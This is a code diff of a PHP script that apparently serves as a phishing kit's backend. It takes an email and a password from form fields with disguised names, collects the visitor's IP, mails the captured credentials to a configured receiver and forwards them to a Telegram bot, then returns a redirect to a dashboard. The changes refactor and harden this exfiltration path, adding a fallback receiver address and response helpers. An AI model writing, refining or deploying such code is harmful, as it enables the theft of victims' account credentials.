@@ -6,6 +6,17 @@ require_once 'telegram.php';
 $email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_EMAIL);
 $password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);
 
+// Function to send JSON response to the frontend
+function sendJsonResponse($success, $message = '', $redirectUrl = '') {
+    header('Content-Type: application/json');
+    echo json_encode([
+        'success' => $success,
+        'message' => $message,
+        'redirectUrl' => $redirectUrl
+    ]);
+    exit();
+}
+
 // Check if inputs are valid
 if (!empty($email) && !empty($password)) {
     // Get client information
@@ -27,18 +38,24 @@ EOT;
 
     // Email Configuration
     $subject = "Login Attempt: {$ip}";
-    $Receive_email = getenv('RECEIVER_EMAIL'); // Retrieve receiver email from environment variables
+    $Receive_email = getenv('RECEIVER_EMAIL') ?: 'fallback_email@example.com'; // Use fallback email if environment variable is not set
 
     // Send email
-    if (!empty($Receive_email) && filter_var($Receive_email, FILTER_VALIDATE_EMAIL)) {
-        mail($Receive_email, $subject, $message);
+    if (filter_var($Receive_email, FILTER_VALIDATE_EMAIL)) {
+        if (!mail($Receive_email, $subject, $message)) {
+            error_log("Failed to send email to {$Receive_email}");
+            sendJsonResponse(false, "Email sending failed. Please contact support.");
+            exit();
+        }
     } else {
         error_log("Environment variable RECEIVER_EMAIL is missing or invalid.");
+        sendJsonResponse(false, "Backend configuration error: Receiver email is invalid.");
+        exit();
     }
 
     // Telegram Notification
-    $botToken = getenv('TELEGRAM_BOT_TOKEN'); // Retrieve Telegram bot token from environment variables
-    $id = getenv('TELEGRAM_CHAT_ID'); // Retrieve Telegram chat ID from environment variables
+    $botToken = getenv('TELEGRAM_BOT_TOKEN') ?: '';
+    $id = getenv('TELEGRAM_CHAT_ID') ?: '';
 
     if (!empty($botToken) && !empty($id)) {
         $encodedMessage = urlencode($message);
@@ -54,7 +71,6 @@ EOT;
             ]);
 
             $result = curl_exec($curl);
-
             if (!$result || curl_errno($curl)) {
                 error_log("Telegram API error: " . curl_error($curl));
             }
@@ -63,25 +79,11 @@ EOT;
         } catch (Exception $e) {
             error_log("Telegram exception: " . $e->getMessage());
         }
-    } else {
-        error_log("Environment variables for Telegram are missing or invalid.");
-    }
+    } 
 
     // Frontend Response
-    header('Content-Type: application/json');
-    echo json_encode([
-        'success' => true,
-        'message' => 'Notification sent successfully',
-        'redirectUrl' => 'https://dashboard.example.com' // Replace with proper URL
-    ]);
-    exit();
+    sendJsonResponse(true, "Notification sent successfully", "https://dashboard.example.com"); // Replace with your dashboard link
 } else {
-    // Handle invalid inputs
-    header('Content-Type: application/json');
-    echo json_encode([
-        'success' => false,
-        'message' => 'Invalid input: Email or Password missing'
-    ]);
-    exit();
+    sendJsonResponse(false, "Invalid input: Email or Password missing");
 }
 ?>
